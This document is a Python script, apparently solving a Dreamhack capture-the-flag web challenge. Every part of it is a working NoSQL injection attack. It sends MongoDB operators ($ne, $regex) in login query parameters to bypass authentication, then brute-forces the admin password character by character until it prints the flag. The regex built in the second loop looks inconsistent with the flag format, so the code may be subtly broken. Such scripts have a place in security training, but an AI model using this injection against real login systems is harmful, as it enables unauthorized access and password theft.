import requests, string

port = "11297"
ALPHANUMERIC = string.digits + string.ascii_letters
answer = ""
count = 10

while(1):
    url = 'http://host3.dreamhack.games:' + port + '/login?uid[$ne]=guest&upw[$regex]=.{'
    url = url + str(count) + '}'
    response = requests.get(url)
    if("undefined" in response.text):
        break
    else :
        count += 1
        
for i in range(1, count - 4):
    for j in ALPHANUMERIC:
        url = 'http://host3.dreamhack.games:' + port + '/login?uid[$ne]=guest&upw[$regex]=D.{'
        url = url + answer + j
        print(url)

        response = requests.get(url)
        if("admin" in response.text):
            answer = answer + j
            print(answer)
            break

answer = "DH{" + answer + "}"
print(answer)
